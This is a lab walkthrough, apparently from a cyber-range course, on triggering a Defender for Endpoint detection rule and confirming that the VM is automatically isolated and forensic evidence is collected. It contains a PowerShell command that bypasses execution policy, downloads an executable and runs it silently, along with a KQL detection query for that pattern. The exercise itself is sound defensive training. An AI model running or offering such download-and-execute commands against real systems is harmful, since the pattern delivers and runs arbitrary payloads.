# Step 3: Triggering the Detection and Observing the Automated Response

In this step, we simulate a Remote Code Execution (RCE) event by running a crafted PowerShell command. This will trigger the custom detection rule created earlier and initiate automatic isolation and forensic evidence collection.

---

## Objective

- Execute a PowerShell command that mimics an RCE attack
- Trigger the detection rule
- Confirm that the VM is automatically isolated
- Confirm that an investigation package is being collected

---

## Simulated Attack Command

Run the following command from **inside your onboarded Windows VM**:

```powershell
cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command "Invoke-WebRequest -Uri 'https://sacyberrange00.blob.core.windows.net/vm-applications/7z2408-x64.exe' -OutFile C:\ProgramData\7z2408-x64.exe; Start-Process 'C:\ProgramData\7z2408-x64.exe' -ArgumentList '/S' -Wait"
````

This command:

* Downloads the 7-Zip installer using `Invoke-WebRequest`
* Silently installs it using `Start-Process`

> Make sure this command exactly matches what your detection rule is designed to catch.

---

## What to Expect

Once the command is executed:

1. **Log entries appear** in the `DeviceProcessEvents` table (within \~1–2 minutes)
2. Your detection rule will **fire an alert**
3. MDE will:

   * Automatically **isolate the VM**
   * Start **collecting an investigation package**

---

## Validate the Detection

### Option 1: Monitor via MDE Portal

* Go to: [https://security.microsoft.com](https://security.microsoft.com)
* Navigate to:

  ```
  Incidents & Alerts → Alerts
  ```
* Look for an alert titled `Potential PowerShell RCE Detected on VM`

### Option 2: Search via Advanced Hunting

Use this KQL query to confirm detection logs:

```kql
DeviceProcessEvents
| where InitiatingProcessCommandLine contains "Invoke-WebRequest"
  and InitiatingProcessCommandLine contains "Start-Process"
| order by Timestamp desc
```

---

## Is VM Isolated?

* Try pinging or remoting into the VM — you should be blocked
* In the MDE Portal:

  * Go to `Assets → Devices`
  * Click your VM and confirm the "Isolated" tag is active

---

## Is Investigation Package Collected?

* Go to:
  ```
  Action Center → Investigation Packages
  ```
* Wait until the package status shows **Completed**
* Download it for offline review (covered in Step 4)

---

## Outcome

At the end of this step:

* Your simulated RCE event was detected
* The VM was automatically isolated from the network
* An investigation package was generated for forensic analysis

---

If nothing happens after several minutes, double-check:
> * Your VM name is correctly referenced in the KQL
> * The PowerShell command syntax matches your detection query
> * Logs are appearing in `DeviceProcessEvents`
